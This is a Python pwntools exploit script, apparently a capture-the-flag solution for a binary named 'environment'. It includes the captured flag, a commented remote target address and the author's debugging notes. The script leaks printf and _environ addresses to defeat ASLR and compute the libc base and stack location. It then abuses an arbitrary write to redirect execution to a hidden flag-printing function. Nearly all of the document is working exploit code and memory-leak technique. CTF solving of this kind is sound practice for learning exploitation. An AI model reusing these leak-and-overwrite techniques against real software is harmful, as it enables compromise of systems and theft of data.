from pwn import *
import struct

'''
/root/.cargo/bin/pwninit auto downloads linker
CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}

'''
local_bin = "./environment"
elf = ELF(local_bin)
rop = ROP(elf)
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")

p = gdb.debug(local_bin, '''
	break *0x401477
	#break recycle
	#break *__run_exit_handlers+474
	#break *0x7ffff7a25140
	continue
	''',env={'LD_PRELOAD':"./libc.so.6"})

#p = process(local_bin)

#p = remote('138.68.147.93',30546)

OFFSET_CAT_FLAG = elf.symbols['hidden_resources']
print("OFFSET_CAT_FLAG = ", hex(OFFSET_CAT_FLAG))

OFFSET_EXIT_GOT = elf.got['exit']
print("EXIT_GOT = ", hex(OFFSET_EXIT_GOT))

def addPlant(location,value):
	p.sendline(b'1')
	p.recvuntil(b'>')
	#What do you want to plant?
	p.sendline(location)
	p.recvuntil(b'>')
	p.sendline(value)

def recycle(item):
	p.sendline(b'2')
	p.recvuntil(b'>')
	p.sendline(item)
	p.recvuntil(b'>')
	p.sendline(b'n')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

leak_printf = p.recvuntil(b'gift: \x1b[0m[')
leak_printf = p.recvuntil(b']')
leak_printf = leak_printf[:-1]
leak_printf = int(leak_printf, 16)
print("printf@got = ",leak_printf)

libc_base = leak_printf - libc.sym["printf"]
print("libc base = ",hex(libc_base))
libc.address = libc_base


p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

OFFSET_ENVIRON_GOT = libc.sym['_environ']
print("OFFSET_ENVIRON_GOT = ", hex(OFFSET_ENVIRON_GOT))

OFFSET_ENVIRON_TO_RSP = 0x7fffffffee58 - 0x7fffffffed38 

print("[+] Recycling 10 times")
p.recvuntil(b'>')
p.sendline(b'2')
p.recvuntil(b'>')
p.sendline(b'1')
p.recvuntil(b'>')
p.sendline(b'n')
p.recvuntil(b'>')
p.sendline(str(OFFSET_ENVIRON_GOT))

leak_environ = p.recvuntil(b'\x1b[0m')
leak_environ = p.recvuntil(b'\n')
leak_environ = leak_environ[:-1]
print("leak_environ = ",leak_environ)
leak_environ = (int(leak_environ[::-1].hex(), 16))
print("leak_environ = ",hex(leak_environ))

p.recvuntil(b'>')
#location = int("0x7ffff7fb0608",16)
location = str(leak_environ - OFFSET_ENVIRON_TO_RSP)
value = str(OFFSET_CAT_FLAG)
addPlant(location,value)

p.interactive()



'''
0x4014f0 <recycle+85>     mov    eax, 0
0x4014f5 <recycle+90>     call   __isoc99_scanf@plt <__isoc99_scanf@plt>

scanf %d no overflow here
###########################

0x40126f <form+63>    mov    rsi, rax
0x401272 <form+66>    mov    edi, 0
0x401277 <form+71>    call   read@plt <read@plt>

read in 3 bytes
###########################
after first recycle:
rsp = 0x7fffffffe4d8
scanf 0x7fffffffe4c4
rsp = 0x7fffffffe4d8
read =0x7fffffffe48c

###########################
After recycle 10 times:
read 10 bytes into 0x7fffffffe490
I can leak any address i want

Send recycle then say its the first time
Count will not be incremented

###########################
Plant:
Write to any address I want

0x401477 <plant+244>    mov    qword ptr [rax], rdx
0x40147a <plant+247>    mov    dword ptr [rip + 0x201bfc], 0x16 <0x603080>

This will auto exit

REL COUNT:
0x603080

Overwriting exit handler 0x7ffff7fb0608
'''